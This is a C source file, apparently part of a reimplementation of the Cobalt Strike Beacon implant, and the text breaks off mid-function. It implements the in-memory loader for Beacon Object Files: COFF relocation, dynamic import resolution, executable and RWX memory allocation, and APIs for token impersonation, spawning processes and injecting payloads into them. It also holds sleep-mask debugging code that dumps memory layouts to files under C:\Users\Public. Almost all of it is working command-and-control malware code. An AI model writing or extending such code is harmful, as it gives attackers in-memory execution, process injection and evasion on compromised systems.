/*
 * Beacon Object File Format (BOFFs)
 *
 * OK, this is just a PE/COFF file parsed and linked by Cobalt Strike's Beacon. It's nothing too special.
 * This is the code to make all of it work though.
 */
#include <Windows.h>
#include <stdio.h>
#include <limits.h>
#include "commands.h"
#include "beacon.h"
#include "parse.h"
#include "inject.h"
#include "bformat.h"
#include "datastore.h"
#include "gargleint.h"

#define RELOC_ENDTABLE 0
#define RELOC_ADDR64   1
#define RELOC64_ADDR32   2  /* IMAGE_REL_AMD64_ADDR32 */
#define RELOC64_ADDR32NB 3  /* IMAGE_REL_AMD64_ADDR32NB — sleep-mask BOF */
#define RELOC_ADDR32   6
#define RELOC_REL32    20
#define RELOC64_REL32_0  4
#define RELOC64_REL32_1  5
#define RELOC64_REL32_2  6
#define RELOC64_REL32_3  7
#define RELOC64_REL32_4  8
#define RELOC64_REL32_5  9

#define SYMBOL_RDATA         1024
#define SYMBOL_DATA          1025
#define SYMBOL_TEXT          1026
#define SYMBOL_DYNAMICF      1027
#define SYMBOL_END           1028
#define SYMBOL_XDATA         1029
#define SYMBOL_PDATA         1030
#define SYMBOL_BSS           1031
#define BOF_DYNAMIC_SLOTS    64

static void postmsgf(int type, char * fmt, ...) {
	va_list va;
	int     est;
	char *  buff;

	/* how much data do we expect to stuff into this buffer? */
	va_start(va, fmt);
	est = _vscprintf(fmt, va);
	va_end(va);

	/* let's sanity check the data */
	if (est <= 0)
		return;

	/* malloc data for our output... */
	buff      = (char *)malloc(est+1);
	buff[est] = 0;

	/* build up our output. */
	va_start(va, fmt);
	vsprintf_s(buff, est+1, fmt, va);
	va_end(va);

	/* post it */
	command_shell_callback(buff, est, type);

	/* clear&free our memory */
	memset(buff, 0, est);
	free(buff);
}

static BOOL use_token_a(HANDLE token) {
	BOOL result;
	char * mem = (char*)malloc(256);
	memset(mem, 0, 256);

	result = use_token(token, mem, 256);

	/* clear&free our memory */
	memset(mem, 0, 256);
	free(mem);

	return result;
}

static void postmsg(int type, char * msg, int len) {
	command_shell_callback(msg, len, type);
}

void spawn_populate(BOOL x86, char * cmdbuff);

static void getspawnproc(BOOL x86, char * buff, int len) {
	char proc[256];
	spawn_populate(x86, proc);

	if (len < 256) {
		memcpy(buff, proc, len);
	}
	else {
		memcpy(buff, proc, 256);
	}
}

static void inject_temp_process(PROCESS_INFORMATION * pi, char * payload, int plen, int off, char * arg, int alen) {
	inject_process_logic(pi, pi->hProcess, pi->dwProcessId, payload, plen, off, arg, alen);
}

static void inject_explicit_process(HANDLE hProcess, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len) {
	inject_process_logic(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
}

typedef struct {
	int   section; /* 4.9: which section the reloc lives in (TEXT/DATA/PDATA) */
	short type;
	short symbol;
	int   offset;
	int   offset_in_section;
} OBJ_RELOC;

typedef struct {
	/* APIs to resolve Win32 modules */
	HMODULE (WINAPI *LoadLibraryA)(__in LPCSTR file);
	BOOL    (WINAPI *FreeLibrary)(HMODULE hLibModule);
	FARPROC (WINAPI *GetProcAddress)(HMODULE hModule, LPCSTR proc);
	HMODULE (WINAPI *GetModuleHandleA)(LPCSTR);

	/* data parser API */
	void    (*BeaconDataParse)(datap *, char * buffer, int size);
	char *  (*BeaconDataPtr)(datap *, int size);
	int     (*BeaconDataInt)(datap *);
	short   (*BeaconDataShort)(datap *);
	int     (*BeaconDataLength)(datap *);
	char *  (*BeaconDataExtract)(datap *, int * size);

	/* string builder API */
	void      (*BeaconFormatAlloc)(formatp * format, int maxsz);
	void      (*BeaconFormatReset)(formatp * format);
	void      (*BeaconFormatAppend)(formatp * format, char * text, int len);
	void      (*BeaconFormatPrintf)(formatp * format, char * fmt, ...);
	char *    (*BeaconFormatToString)(formatp * format, int * size);
	void      (*BeaconFormatFree)(formatp * format);
	void      (*BeaconFormatInt)(formatp * format, int value);

	/* Output Functions */
	void    (*BeaconOutput)(int type, char * msg, int len);
	void    (*BeaconPrintf)(int type, char * fmt, ...);
	void    (*BeaconErrorD)(int type, int arg);
	void    (*BeaconErrorDD)(int type, int arg, int arg2);
	void    (*BeaconErrorNA)(int type);

	/* Token Functions */
	BOOL    (*BeaconUseToken)(HANDLE token);
	void    (*BeaconRevertToken)();
	BOOL    (*BeaconIsAdmin)();

	/* Spawn and Inject */
	void   (*BeaconGetSpawnTo)(BOOL x86, char * buffer, int length);
	void   (*BeaconInjectProcess)(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len);
	void   (*BeaconInjectTemporaryProcess)(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len);
	BOOL   (*BeaconSpawnTemporaryProcess)(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pInfo);
	void   (*BeaconCleanupProcess)(PROCESS_INFORMATION * pInfo);

	/* Utility Functions */
	BOOL   (*toWideChar)(char * src, wchar_t * dst, int max);

	/* 4.9 BOF APIs — order matches resources/bapi.txt */
	void   (*BeaconInformation)(BEACON_INFO * info);
	BOOL   (*BeaconAddValue)(const char * key, void * ptr);
	void * (*BeaconGetValue)(const char * key);
	BOOL   (*BeaconRemoveValue)(const char * key);
	PDATA_STORE_OBJECT (*BeaconDataStoreGetItem)(size_t index);
	void   (*BeaconDataStoreProtectItem)(size_t index);
	void   (*BeaconDataStoreUnprotectItem)(size_t index);
	size_t (*BeaconDataStoreMaxEntries)(void);
	char * (*BeaconGetCustomUserData)(void);

	/* our other pointers */
	void * other[BOF_DYNAMIC_SLOTS];
} BOFF_FUNCTIONS;

void * function_slot(BOFF_FUNCTIONS * f, void * ptr) {
	int x;

	/* try and find our pointer and return a pointer to it! */
	for (x = 0; x < BOF_DYNAMIC_SLOTS; x++) {
		if (f->other[x] == ptr)
			return &(f->other[x]);
	}

	/* boo... OK, find a NULL pointer and return a pointer to that */
	for (x = 0; x < BOF_DYNAMIC_SLOTS; x++) {
		if (f->other[x] == NULL) {
			f->other[x] = ptr;
			return &(f->other[x]);
		}
	}

	return NULL;
}

void setup_functions(BOFF_FUNCTIONS * f) {
	/* clear all of these pointers, please */
	memset(f, 0, sizeof(BOFF_FUNCTIONS));

	/* setup some of our fixed APIs */
	f->LoadLibraryA      = LoadLibraryA;
	f->FreeLibrary       = FreeLibrary;
	f->GetProcAddress    = GetProcAddress;
	f->GetModuleHandleA  = GetModuleHandleA;

	/* data parser API */
	f->BeaconDataParse   = data_init;
	f->BeaconDataPtr     = data_ptr;
	f->BeaconDataInt     = reinterpret_cast<int (*)(datap *)>(data_int);
	f->BeaconDataShort   = reinterpret_cast<short (*)(datap*)>(data_short);
	f->BeaconDataLength  = data_length;
	f->BeaconDataExtract = data_ptr_extract;

	/* beacon format API */
	f->BeaconFormatAlloc    = bformat_init;
	f->BeaconFormatReset    = bformat_reset;
	f->BeaconFormatPrintf   = bformat_printf;
	f->BeaconFormatAppend   = bformat_copy;
	f->BeaconFormatFree     = bformat_free;
	f->BeaconFormatToString = bformat_tostring;
	f->BeaconFormatInt      = bformat_int;

	/* our output function */
	f->BeaconOutput      = postmsg;
	f->BeaconPrintf      = postmsgf;
	f->BeaconErrorD      = post_error_d;
	f->BeaconErrorDD     = post_error_dd;
	f->BeaconErrorNA     = post_error_na;

	/* token API */
	f->BeaconUseToken    = use_token_a;
	f->BeaconIsAdmin     = is_admin;
	f->BeaconRevertToken = command_rev2self;

	/* spawn and inject APIs */
	f->BeaconGetSpawnTo             = getspawnproc;
	f->BeaconCleanupProcess         = cleanupProcess;
	f->BeaconInjectProcess          = inject_explicit_process;
	f->BeaconSpawnTemporaryProcess = spawn_patsy;
	f->BeaconInjectTemporaryProcess = inject_temp_process;

	/* utility functions */
	f->toWideChar                   = toWideChar;

	f->BeaconInformation            = BeaconInformation;
	f->BeaconAddValue               = BeaconAddValue;
	f->BeaconGetValue               = BeaconGetValue;
	f->BeaconRemoveValue            = BeaconRemoveValue;
	f->BeaconDataStoreGetItem       = BeaconDataStoreGetItem;
	f->BeaconDataStoreProtectItem   = BeaconDataStoreProtectItem;
	f->BeaconDataStoreUnprotectItem = BeaconDataStoreUnprotectItem;
	f->BeaconDataStoreMaxEntries    = BeaconDataStoreMaxEntries;
	f->BeaconGetCustomUserData      = BeaconGetCustomUserData;
}

#if defined(_M_X64)
/* Log an exception raised inside the sleep-mask BOF and swallow it, so the
 * beacon survives to sleep again and the fault address lands in the file. */
static int sm_invoke_filter(EXCEPTION_POINTERS * ep) {
	HANDLE h;
	char lb[128];
	DWORD wr;
	int n;
	h = CreateFileA("C:\\Users\\Public\\sm_exc.txt", FILE_APPEND_DATA,
		FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE)
		return EXCEPTION_EXECUTE_HANDLER;
	n = wsprintfA(lb, "code=%08X addr=%p\r\n",
		ep->ExceptionRecord->ExceptionCode, ep->ExceptionRecord->ExceptionAddress);
	WriteFile(h, lb, (DWORD)n, &wr, NULL);
	CloseHandle(h);
	return EXCEPTION_EXECUTE_HANDLER;
}

static DWORD sm_invoke_seh(void * fn, GARGLEP * gp, DWORD t) {
	__try {
		((void (*)(GARGLEP *, void *, DWORD))fn)(gp, (void *)Sleep, t);
		return 0;
	}
	__except (sm_invoke_filter(GetExceptionInformation())) {
		return 1;
	}
}

static void sm_dump_prots(char * buf, int * np, void * p, char * tag) {
	MEMORY_BASIC_INFORMATION m;
	if (p == NULL || VirtualQuery(p, &m, sizeof(m)) == 0) {
		*np += wsprintfA(buf + *np, "%s=?\r\n", tag);
		return;
	}
	*np += wsprintfA(buf + *np, "%s ab=%p alloc=%08X prot=%08X state=%08X type=%08X\r\n",
		tag, m.AllocationBase, m.AllocationProtect, m.Protect, m.State, m.Type);
}

/* last byte offset covered by the (real) sections table, for RWX flips */
static DWORD sm_max_end(GARGLEP * gp) {
	DWORD maxe = 0;
	int i;
	if (gp == NULL || gp->sections == NULL)
		return 0;
	for (i = 0; i < 64; i++) {
		DWORD a = gp->sections[i * 2];
		DWORD b = gp->sections[i * 2 + 1];
		if (a == 0 && b == 0)
			break;
		if (a == 0xFFFFFFFFUL || b == 0xFFFFFFFFUL)
			continue;
		if (b > maxe)
			maxe = b;
	}
	return maxe;
}

/* SizeOfImage from our own PE header: the true extent of the mapped image.
 * The TS-delivered GARGLE_SECTIONS table describes the OFFICIAL sleeve
 * layout, which is larger than ours; walking it runs off our mapping. */
static DWORD sm_image_size(char * base) {
	unsigned short e_lfanew;
	if (base == NULL || base[0] != 'M' || base[1] != 'Z')
		return 0;
	memcpy(&e_lfanew, base + 0x3C, sizeof(e_lfanew));
	if (base[e_lfanew] != 'P' || base[e_lfanew + 1] != 'E')
		return 0;
	return *(DWORD *)(base + e_lfanew + 0x50);
}

/* Keep only the first `keep` pairs of the (real) sections table and END it:
 * bisects which masked range kills the process. */
static void sm_keep_pairs(GARGLEP * gp, int keep) {
	int i;
	if (gp == NULL || gp->sections == NULL)
		return;
	for (i = 0; i < 64; i++) {
		if (i == keep || (gp->sections[i * 2] == 0 && gp->sections[i * 2 + 1] == 0)) {
			gp->sections[i * 2] = 0;
			gp->sections[i * 2 + 1] = 0;
			return;
		}
	}
}

/* Clamp the sections walk to our own image: pairs beyond SizeOfImage end
 * the table, pairs straddling it are cut. Returns the new span. */
static DWORD sm_clamp_sections(GARGLEP * gp) {
	DWORD img = sm_image_size(gp ? gp->beacon_ptr : NULL);
	int i;
	if (img == 0 || gp->sections == NULL)
		return 0;
	for (i = 0; i < 64; i++) {
		DWORD a = gp->sections[i * 2];
		DWORD b = gp->sections[i * 2 + 1];
		if (a == 0 && b == 0)
			break;
		if (a >= img) {
			gp->sections[i * 2] = 0;
			gp->sections[i * 2 + 1] = 0;
			break;
		}
		if (b > img)
			gp->sections[i * 2 + 1] = img;
	}
	return sm_max_end(gp);
}


static DWORD g_sm_spanraw;
static DWORD g_sm_img;
static char * g_sm_snap;
static DWORD g_sm_snaplen;

static void sm_dump_gparms(GARGLEP * gp, char * bof, SIZE_T blen, DWORD t,
	DWORD sm_mode, DWORD sm_span, void * entryp) {
	HANDLE h;
	char buf[4096];
	int n = 0;
	int i;
	DWORD wr;
	h = CreateFileA("C:\\Users\\Public\\sm_gparms.txt", GENERIC_WRITE, FILE_SHARE_READ,
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE)
		return;
	n += wsprintfA(buf + n, "t=%u bof=%p blen=%u gp=%p\r\n", t, bof, (unsigned)blen, gp);
	if (gp == NULL) {
		WriteFile(h, buf, (DWORD)n, &wr, NULL);
		CloseHandle(h);
		return;
	}
	n += wsprintfA(buf + n, "beacon_ptr=%p sections=%p heap=%p\r\n",
		gp->beacon_ptr, gp->sections, gp->heap_records);
	n += wsprintfA(buf + n, "sm_mode=%u spanraw=%X span=%X img=%X procinj I=%04X F=%04X\r\n",
		sm_mode, g_sm_spanraw, sm_span, g_sm_img,
		(unsigned short)setting_short(SETTING_PROCINJ_PERMS_I),
		(unsigned short)setting_short(SETTING_PROCINJ_PERMS));
	sm_dump_prots(buf, &n, gp->beacon_ptr, "q_beacon:");
	if (sm_span != 0)
		sm_dump_prots(buf, &n, (char *)gp->beacon_ptr + sm_span - 1, "q_beacon_end:");
	if (gp->beacon_ptr != NULL && g_sm_spanraw != 0) {
		DWORD off;
		for (off = 0; off < g_sm_spanraw + 0x10000 && n < 3700; off += 0x10000) {
			MEMORY_BASIC_INFORMATION m;
			if (VirtualQuery((char *)gp->beacon_ptr + off, &m, sizeof(m)) == 0) {
				n += wsprintfA(buf + n, "pg[%05X] ?\r\n", off);
				continue;
			}
			n += wsprintfA(buf + n, "pg[%05X] ab=%p prot=%08X st=%08X\r\n",
				off, m.AllocationBase, m.Protect, m.State);
		}
	}
	sm_dump_prots(buf, &n, gp->sections, "q_sect:");
	sm_dump_prots(buf, &n, gp->heap_records, "q_heap:");
	sm_dump_prots(buf, &n, bof, "q_bof:");
	/* live bytes at the killer range and the in-memory PE section table */
	if (bof != NULL) { /* marker that gp->beacon_ptr is valid too */
		unsigned __int64 v5 = *(unsigned __int64 *)(gp->beacon_ptr + 0x62000);
		unsigned __int64 v6 = *(unsigned __int64 *)(gp->beacon_ptr + 0x63000);
		unsigned short lfanew;
		unsigned short optsize;
		int sec;
		n += wsprintfA(buf + n, "k62000=%08X%08X k63000=%08X%08X\r\n",
			(unsigned)(v5 >> 32), (unsigned)v5, (unsigned)(v6 >> 32), (unsigned)v6);
		memcpy(&lfanew, gp->beacon_ptr + 0x3C, sizeof(lfanew));
		memcpy(&optsize, gp->beacon_ptr + lfanew + 20, sizeof(optsize));
		if (lfanew > 0 && lfanew < 0x400 && optsize >= 0xF0 - 24 && optsize < 0x400) {
			unsigned short nsec;
			DWORD sectbl = lfanew + 24 + optsize;
			memcpy(&nsec, gp->beacon_ptr + lfanew + 6, sizeof(nsec));
			n += wsprintfA(buf + n, "nsec=%u\r\n", nsec);
			for (sec = 0; sec < nsec && sec < 8; sec++) {
				unsigned int vs, va;
				char nm[9];
				memcpy(nm, gp->beacon_ptr + sectbl + sec * 40, 8);
				nm[8] = 0;
				memcpy(&vs, gp->beacon_ptr + sectbl + sec * 40 + 8, 4);
				memcpy(&va, gp->beacon_ptr + sectbl + sec * 40 + 12, 4);
				n += wsprintfA(buf + n, "mem[%u] %-8s va=%06X vs=%06X\r\n", sec, nm, va, vs);
			}
		}
	}
	if (entryp != NULL) {
		unsigned __int64 v = *(unsigned __int64 *)entryp;
		n += wsprintfA(buf + n, "entry=%p bytes=%08X%08X\r\n",
			entryp, (unsigned)(v >> 32), (unsigned)v);
	}
	/* sample the live BOF mapping so it can be diffed against the
	 * sleepmask.x64.o we disassembled offline */
	{
		int s;
		static const int spots[] = { 0x40, 0x80, 0xc0, 0x100, 0x180 };
		for (s = 0; s < 5 && bof != NULL; s++) {
			unsigned __int64 v = *(unsigned __int64 *)(bof + spots[s]);
			n += wsprintfA(buf + n, "bof[%03X]=%08X%08X\r\n",
				spots[s], (unsigned)(v >> 32), (unsigned)v);
		}
	}
	if (gp->sections == NULL)
		n += wsprintfA(buf + n, "sections=NULL\r\n");
	else {
		for (i = 0; i < 24 && n < 3200; i++) {
			DWORD a = gp->sections[i * 2];
			DWORD b = gp->sections[i * 2 + 1];
			n += wsprintfA(buf + n, "sec[%d] %08X %08X", i, a, b);
			if (a == 0 && b == 0) {
				n += wsprintfA(buf + n, " END\r\n");
				break;
			}
			if (a >= b)
				n += wsprintfA(buf + n, " BAD_ORDER");
			if (a == 0xFFFFFFFFUL || b == 0xFFFFFFFFUL)
				n += wsprintfA(buf + n, " NEG1");
			n += wsprintfA(buf + n, "\r\n");
		}
	}
	if (gp->heap_records == NULL)
		n += wsprintfA(buf + n, "heap=NULL FAULT_[rcx+10]\r\n");
	else {
		int total = 0;
		char * harr;
		char * hend;
		while (gp->heap_records[total].ptr != NULL)
			total++;
		harr = (char *)gp->heap_records;
		hend = harr + (total + 1) * (int)sizeof(HEAP_RECORD);
		n += wsprintfA(buf + n, "heapN=%d\r\n", total);
		for (i = 0; i < 64 && n < 3900; i++) {
			char * p = gp->heap_records[i].ptr;
			unsigned z = (unsigned)gp->heap_records[i].size;
			n += wsprintfA(buf + n, "heap[%d] ptr=%p size=%u", i, p, z);
			if (p == NULL) {
				n += wsprintfA(buf + n, " END\r\n");
				break;
			}
			if (bof != NULL && p >= bof && p < bof + blen)
				n += wsprintfA(buf + n, " IN_BOF");
			if (p < (char *)gp + sizeof(GARGLEP) && p + z > (char *)gp)
				n += wsprintfA(buf + n, " COVERS_GPARMS");
			if (p < hend && p + z > harr)
				n += wsprintfA(buf + n, " COVERS_HEAP_ARRAY");
			if (p < (char *)gp->sections + 64 && p + z > (char *)gp->sections)
				n += wsprintfA(buf + n, " COVERS_SECTIONS");
			n += wsprintfA(buf + n, "\r\n");
		}
	}
	WriteFile(h, buf, (DWORD)n, &wr, NULL);
	CloseHandle(h);
}
#endif

/*
 * These get somewhat complicated. Here's what the variables mean:
 *
 * execsrc - the current source of our .text section/executable code. We need to lift offsets from this memory
 * execdst - the planned destination of our .text section/executable code. It may not be populated yet. But, we may need to calculate offsets relative to it.
 * symbol  - a pointer to the symbol we're processing a relocation for.
 *
 * Return value: if value is false, relocation process failed and the BOFF should not execute. This function reports its own errors.
 */
BOOL process_reloc(OBJ_RELOC * reloc, char * execsrc, char * execdst, char * symbol, int soff, char * imgbase) {
#if defined _M_IX86
	(void)imgbase;
	if (reloc->type == RELOC_ADDR32) {
		DWORD addr, offset, rip;

		memcpy(&offset, execsrc + reloc->offset, 4);
		addr = (DWORD)symbol + (DWORD)offset + soff;
		memcpy(execsrc + reloc->offset, &addr, 4);

		return TRUE;
	}
	else if (reloc->type == RELOC_REL32) {
		DWORD addr, offset, rip;

		/* calculate the RIP of where this data will be ref'd from */
		rip = (DWORD)execdst + reloc->offset + 4;

		/* calculate the location of our rdata */
		memcpy(&offset, execsrc + reloc->offset, 4);
		addr = (DWORD)symbol + (DWORD)offset + soff;

		/* figure out the difference between rip and addr */
		addr = addr - rip;

		/* copy it back in... */
		memcpy(execsrc + reloc->offset, &addr, 4);

		return TRUE;
	}
#elif defined _M_X64
	if (reloc->type == RELOC_ADDR64) {
		UINT64 addr, offset;
		memcpy(&offset, execsrc + reloc->offset, 8);
		addr = (UINT64)(ULONG_PTR)symbol + offset + (UINT64)(ULONG_PTR)soff;
		memcpy(execsrc + reloc->offset, &addr, 8);
		return TRUE;
	}
	else if (reloc->type == RELOC64_ADDR32NB) {
		/* IMAGE_REL_AMD64_ADDR32NB: 32-bit RVA from the BOF mapping base.
		 * sleepmask.x64.o uses this only in .pdata (RUNTIME_FUNCTION). */
		DWORD addend, rva;
		UINT64 target, basev;
		if (imgbase == NULL) {
			post_error_d(0x4f, reloc->type);
			return FALSE;
		}
		memcpy(&addend, execsrc + reloc->offset, 4);
		target = (UINT64)(ULONG_PTR)symbol + addend + (UINT64)(ULONG_PTR)soff;
		basev = (UINT64)(ULONG_PTR)imgbase;
		if (target < basev || (target - basev) > 0xFFFFFFFFULL) {
			post_error_na(0x4d);
			return FALSE;
		}
		rva = (DWORD)(target - basev);
		memcpy(execsrc + reloc->offset, &rva, 4);
		if (execdst != NULL && execdst != execsrc)
			memcpy(execdst + reloc->offset, &rva, 4);
		return TRUE;
	}
	else if (reloc->type >= RELOC64_REL32_0 && reloc->type <= RELOC64_REL32_5) {
		char * rip, * fsymbol;
		DWORD offset, addr;
		INT64 check;

		/* calculate the RIP of where this data will be ref'd from */
		rip = (char *)execdst + reloc->offset + reloc->type;

				/* OK, this is confusing, but... here goes... RELOC64_REL32_0 means we want
				 * the RIP at the end of this total encoded instruction AND our offset is
				 * the last 4 bytes of this encoded instruction. The other offsets after 0
				 * mean there are additional bytes within this encoded instruction and our
				 * relocation offset is tucked into the middle of that instruction. We just
				 * treat reloc->type as a offset to the next instruction following where our
				 * patched relocation offset begins. */

		/* calculate the location of our rdata */
		memcpy(&offset, execsrc + reloc->offset, 4);
		fsymbol = (char *)symbol + offset + soff;

		/* figure out the difference between rip and addr */
		addr = (DWORD)((char *)fsymbol - (char *)rip);

		/* verify that our rip/addr offset can fit in 4b. If it can't, we have a problem and we need to bail */
		check = (INT64)fsymbol - (INT64)rip;

		if (check > INT_MAX || check < INT_MIN) {
			//dlog("0x4d (reloction): symbol@ %p code@ %p  distance: %p", fsymbol, rip, check);
			post_error_na(0x4d);
			return FALSE;
		}

		/* copy it back in... */
		memcpy(execsrc + reloc->offset, &addr, 4);

		return TRUE;
	}
#endif
	else {
		post_error_d(0x4f, reloc->type);
		return FALSE;
	}
}

//void print_reloc(OBJ_RELOC * r) {
	//dlog("Reloc[type: %d, symbol: %d, offset: %d, offset_in_section: %d]", r->type, r->symbol, r->offset, r->offset_in_section);
//}

static char * bof_section_base(int id, char * text, char * rdata, char * data, char * xdata, char * pdata, char * bss) {
	switch (id) {
	case SYMBOL_RDATA: return rdata;
	case SYMBOL_DATA:  return data;
	case SYMBOL_TEXT:  return text;
	case SYMBOL_XDATA: return xdata;
	case SYMBOL_PDATA: return pdata;
	case SYMBOL_BSS:   return bss;
	default:           return text;
	}
}

static char * bof_alloc(SIZE_T total, int * how) {
	DWORD perms = setting_short(SETTING_PROCINJ_PERMS_I);
	int allocator = setting_short(SETTING_BOF_ALLOCATOR);
	*how = allocator;
	if (allocator == 1) {
		HANDLE map = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, (DWORD)total, NULL);
		char * p;
		if (map == NULL)
			return NULL;
		p = (char *)MapViewOfFile(map, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, total);
		CloseHandle(map);
		return p;
	}
	if (allocator == 2) {
		HANDLE heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
		if (heap == NULL)
			return NULL;
		return (char *)HeapAlloc(heap, HEAP_ZERO_MEMORY, total);
	}
	*how = 0;
	if (perms == 0)
		perms = PAGE_READWRITE;
	return (char *)VirtualAlloc(NULL, total, MEM_RESERVE | MEM_COMMIT, perms);
}

static void bof_free(char * p, int how) {
	if (p == NULL)
		return;
	if (how == 1)
		UnmapViewOfFile(p);
	else if (how == 2)
		return; /* HeapCreate block is not tracked; leak vs double-free. reuse covers this. */
	else
		VirtualFree(p, 0, MEM_RELEASE);
}

static char * bof_cached;
static SIZE_T bof_cached_size;
static int    bof_cached_how;

BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entry, char * args, int alen, int conv) {
	datap parser;
	datap relocsparser;
	datap_buffer code, rdata, data, xdata, pdata, relocs;
	DWORD bssSize;
	BOFF_FUNCTIONS * ftable;
	void(*inlinefunc)(char * buffer, int length);
	char * base;
	char * code_dst;
	char * rdata_dst;
	char * data_dst;
	char * xdata_dst;
	char * pdata_dst;
	char * bss_dst;
	SIZE_T total;
	OBJ_RELOC * reloc;
	BOOL success = FALSE;
	int how = 0;

	ftable = (BOFF_FUNCTIONS *)malloc(sizeof(BOFF_FUNCTIONS));
	if (ftable == NULL)
		return FALSE;
	setup_functions(ftable);

	data_init(&parser, objblob, objlen);
	bssSize = data_int(&parser);
	code = data_extract(&parser);
	rdata = data_extract(&parser);
	data = data_extract(&parser);
	xdata = data_extract(&parser);
	pdata = data_extract(&parser);
	relocs = data_extract(&parser);

	total = (SIZE_T)code.length + rdata.length + data.length + xdata.length + pdata.length + bssSize;
	if (total == 0) {
		free(ftable);
		return FALSE;
	}

	if (setting_short(SETTING_BOF_REUSE_MEMORY) && bof_cached != NULL && bof_cached_size >= total) {
		base = bof_cached;
		how = bof_cached_how;
		memset(base, 0, total);
	}
	else {
		if (bof_cached != NULL && !setting_short(SETTING_BOF_REUSE_MEMORY)) {
			bof_free(bof_cached, bof_cached_how);
			bof_cached = NULL;
			bof_cached_size = 0;
		}
		base = bof_alloc(total, &how);
		if (base == NULL) {
			free(ftable);
			return FALSE;
		}
		bof_cached = base;
		bof_cached_size = total;
		bof_cached_how = how;
	}

	code_dst = base;
	rdata_dst = code_dst + code.length;
	data_dst = rdata_dst + rdata.length;
	xdata_dst = data_dst + data.length;
	pdata_dst = xdata_dst + xdata.length;
	bss_dst = pdata_dst + pdata.length;

	if (code.buffer) memcpy(code_dst, code.buffer, code.length);
	if (rdata.buffer) memcpy(rdata_dst, rdata.buffer, rdata.length);
	if (data.buffer) memcpy(data_dst, data.buffer, data.length);
	if (xdata.buffer) memcpy(xdata_dst, xdata.buffer, xdata.length);
	if (pdata.buffer) memcpy(pdata_dst, pdata.buffer, pdata.length);

	data_init(&relocsparser, relocs.buffer, relocs.length);
	while (TRUE) {
		char * src;
		char * dst;
		char * sym;
		reloc = (OBJ_RELOC *)data_ptr(&relocsparser, sizeof(OBJ_RELOC));
		if (reloc == NULL)
			break;
		if (reloc->symbol == SYMBOL_END) {
			success = TRUE;
			break;
		}
		src = bof_section_base(reloc->section, code.buffer, rdata.buffer, data.buffer, xdata.buffer, pdata.buffer, bss_dst);
		dst = bof_section_base(reloc->section, code_dst, rdata_dst, data_dst, xdata_dst, pdata_dst, bss_dst);
		if (src == NULL)
			src = code.buffer;
		if (dst == NULL)
			dst = code_dst;

		if (reloc->symbol == SYMBOL_DYNAMICF) {
			char * lib = data_string_asciiz(&relocsparser);
			char * fun = data_string_asciiz(&relocsparser);
			void * ptr;
			void * slot;
			HMODULE mod = GetModuleHandleA(lib);
			if (mod == NULL)
				mod = LoadLibraryA(lib);
			ptr = GetProcAddress(mod, fun);
			if (ptr == NULL) {
				post_error(0x4c, "%s!%s", lib, fun);
				break;
			}
			slot = function_slot(ftable, ptr);
			if (slot == NULL) {
				post_error_na(0x4e);
				break;
			}
			if (!process_reloc(reloc, src, dst, (char *)slot, 0, base))
				break;
		}
		else if (reloc->symbol < 1024) {
			if (!process_reloc(reloc, src, dst, (char *)ftable + (reloc->symbol * sizeof(char *)), 0, base))
				break;
		}
		else {
			sym = bof_section_base(reloc->symbol, code_dst, rdata_dst, data_dst, xdata_dst, pdata_dst, bss_dst);
			if (!process_reloc(reloc, src, dst, sym, reloc->offset_in_section, base))
				break;
		}
	}

	if (success) {
		/* Relocs patch the extract buffers (execsrc). Copy them onto the
		 * executable mapping before wiping the extracts. */
		if (code.buffer) memcpy(code_dst, code.buffer, code.length);
		if (rdata.buffer) memcpy(rdata_dst, rdata.buffer, rdata.length);
		if (data.buffer) memcpy(data_dst, data.buffer, data.length);
		if (xdata.buffer) memcpy(xdata_dst, xdata.buffer, xdata.length);
		if (pdata.buffer) memcpy(pdata_dst, pdata.buffer, pdata.length);
		if (code.buffer)
			memset(code.buffer, 0, code.length);
		inlinefunc = (void(*)(char * buffer, int length))(code_dst + entry);
		if (finalize_memory_permissions(base, total)) {
			if (conv == 1) {
				DWORD t = 0;
				BEACON_INFO info;
				static DWORD empty_sections[2] = { 0, 0 };
				if (args != NULL && alen >= (int)sizeof(DWORD))
					memcpy(&t, args, sizeof(DWORD));
				gargle_setup_parms(code_dst, code_dst + code.length, 0);
				beacon_sleep_mask_set_exec(code_dst, (DWORD)code.length, (DWORD)total);
				BeaconInformation(&info);
				if (info.sections == NULL)
					info.sections = empty_sections;
				info.heap_records = track_memory_get_heap_records_to_mask();
				if (info.heap_records != NULL && info.sections != NULL) {
					int r, w;
					for (r = 0, w = 0; ; r++) {
						if (info.heap_records[r].ptr == (char *)info.sections)
							continue;
						if (w != r)
							info.heap_records[w] = info.heap_records[r];
						if (info.heap_records[r].ptr == NULL)
							break;
						w++;
					}
				}
				if (gparms != NULL) {
					gparms->beacon_ptr = info.beacon_ptr;
					gparms->sections = info.sections;
					gparms->heap_records = info.heap_records;
					memcpy(gparms->mask, info.mask, MASK_SIZE);
				}
#if defined(_M_X64)
				/* Diagnostic switches, re-checked on every sleep:
				   C:\Users\Public\sm_empty -> invoke with an empty sections table
				   and a terminator-only heap table.
				   C:\Users\Public\sm_sect  -> real sections, empty heap (XOR image only).
				   C:\Users\Public\sm_heap  -> empty sections, real heap (XOR heap only).
				   C:\Users\Public\sm_t1    -> invoke with time=1ms (window discriminator).
				   C:\Users\Public\sm_wrwx  -> VirtualProtect the beacon image to RWX
				   before invoke (left RWX; tests the RX-write hypothesis). */
				{
					static HEAP_RECORD sm_empty_heap[1] = { { NULL, 0 } };
					DWORD sm_mode = 0;
					DWORD sm_span;
					if (GetFileAttributesA("C:\\Users\\Public\\sm_empty") != INVALID_FILE_ATTRIBUTES)
						sm_mode |= 1;
					if (GetFileAttributesA("C:\\Users\\Public\\sm_wrwx") != INVALID_FILE_ATTRIBUTES)
						sm_mode |= 2;
